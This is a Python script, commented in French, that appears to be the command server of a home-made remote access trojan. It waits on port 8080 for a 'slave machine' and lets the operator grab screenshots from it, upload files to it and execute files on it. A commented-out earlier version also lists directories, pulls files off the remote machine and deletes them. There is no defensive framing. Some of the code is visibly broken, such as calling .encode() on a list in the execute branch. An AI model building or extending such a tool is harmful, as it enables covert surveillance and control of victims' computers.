import os, socket

# On démare notre reseaux sur s
s= socket.socket()

# On définit notre host / port 
host= socket.gethostname()
port= 8080

# On associ notre host et port au réseau
s.bind((host, port))
print(f"[Server is currently running as: {host}]")
print("[Waiting for connection]")

s.listen(True)
conn, addr= s.accept()
print(f"\n[{addr} is connected]")

while True:
	command= input(str("- - - - - - - - - - - - \n>>> ")).split()
	if len(command) != 0:
		if command[0] in ["scrn", "screenshot"]:
			if len(command) == 2:
				conn.send(command[0].encode())
				print("[Waiting for screenshot]")
				if (byte:= conn.recv(1000000)) == False:
					print("[ERROR: Failed to take screenshot]")
					continue 
				else:
					file= open("test.jpg", "wb")     
					file.write(byte)
					file.close()
					print("[screenshot has been saved]")
					
			elif len(command) == 1:	
				conn.send(command[0].encode())
				print("[Waiting for screenshot]")
				if (byte:= conn.recv(1000000)) == False:
					print("[ERROR: Failed to take screenshot]")
					continue 

				else:
					file_path= str(input("Enter new file path: "))
					file= open(file_path, "wb")     
					file.write(byte)
					file.close()
					print(f"[screenshot has been saved as '{file_path}']")

			else:
				print("[Invalide syntaxe]")
				
		elif command[0] in ["upl", "upload", "upload_file"]:
			if len(command) == 2:
				conn.send(command[0].encode())
				print("[Uploding file...]")
				file= open(command[1], "rb")
				data= file.read()
				conn.send(data)
				if conn.recv(1024) == False:
					print("[ERROR: Failed to upload file]")

				else:
					print("[File has been uploaded]")

			elif  len(command) == 1:
				conn.send(command[0].encode())
				print("[Uploding file...]")
				file_path= str(input("Enter file path: "))
				file= open(file_path, "rb")
				data= file.read()
				conn.send(data)
				if conn.recv(1024) == False:
					print("[ERROR: Failed to upload file]")

				else:
					print("[File has been uploaded]")

			else:
				print("[Invalide syntaxe]")
		
		elif command[0] in ["exe", "exec", "execute"]:
			if len(command) == 2:
				conn.send(command.encode())
				conn.send(command[1].encode())
				if conn.recv(1024) == False:
					print("[ERROR: Failed to execute file]")

				else:
					print("[File has been successfully executed]")
				 
			elif len(command) == 1:
				conn.send(command.encode())
				file_path= str(input("Enter file path: "))
				conn.send(file_path.encode())
				if conn.recv(1024) == False:
					print("[ERROR: Failed to execute file]")

				else:
					print("[File has been successfully executed]")

			else:
				print("[Invalide syntaxe]")

		elif command[0] ==	"help":
			# Modification possible: dictionnaire 
			print("'upload [file_path]': to upload file\n'screenshot [file_path]': to take a screenshot from slave machine into slave machine\n'help': to get details on commands")
			

		else:
			os.system(command[0])
		



# # Création de l'objet de communication
# s= socket.socket()

# # Définition de l'host / port
# host= socket.gethostname()
# port= 8080

# # Attribution des informations de connection
# s.bind((host, port))
# print(f"[Server is currently renning on... {host}]") 
# print("[Waiting for connections...]")

# # Ecoute, Attente de tier
# s.listen(True)

# # ...
# conn, addr= s.accept()
# print(f"[{addr} has connected to the server successfully]")



# # Connection établit
# #	...
# # Envoie d'ordres au client:


# while 1:
# 	command = input(str("\n>>>"))
# 	if command == "view_cwd":

# 		# Envoie de commande encodé
# 		conn.send(command.encode())
# 		print("[Command sent, waiting for execution...]")

# 		# Waiting for feedback
# 		files= conn.recv(5000)

# 		# Deceding feedback
# 		files= files.decode()
# 		print(f"[Command output: {files}]")



# 	elif command == "custom_dir":
# 		# Envoie de commande encodé
# 		conn.send(command.encode())

# 		# Entrer le nom du fichier
# 		user_input= input(str("Custom dir: "))

# 		# Envoie de l'ordre
# 		conn.send(user_input.encode())
# 		print("[Command sent, waiting for execution...]")

# 		# Reception du nom de fichier
# 		files= conn.recv(5000)

# 		# Decoder le nom du fichier
# 		files= files.decode()
# 		print(f"[Custom file result: {files}]")

# 	elif command == "download_file":
# 		# Envoie de commande encodé
# 		conn.send(command.encode())
# 		file_path= input(str("Enter the file path: "))

# 		# Envoie du nom de fichier
# 		conn.send(file_path.encode())

# 		# Reception du contenue du fichier
# 		file= conn.recv(10000)

# 		# Donner un nom de fichier
# 		filename= input(str("Give a path to the file: "))

# 		# Ouverture du nouveau fichier
# 		new_file= open(filename, "wb")

# 		# Télévertion 
# 		new_file.write(file)
# 		new_file.close()
# 		print(f"[{filename}, has successfully been downloaded]")

# 	elif command== "delete_file":
# 		conn.send(command.encode())
# 		file_path= input(str("Enter the file path: "))
# 		conn.send(file_path.encode())
# 		print("[File has been deleted successfully]")

# 	elif command == "screenshot":
# 		conn.send(command.encode())
# 		print("[Waiting for screenshot]")
# 		bytes= conn.recv(10000)
# 		print(bytes)



# 	else:
# 		print("[Command not recognised]")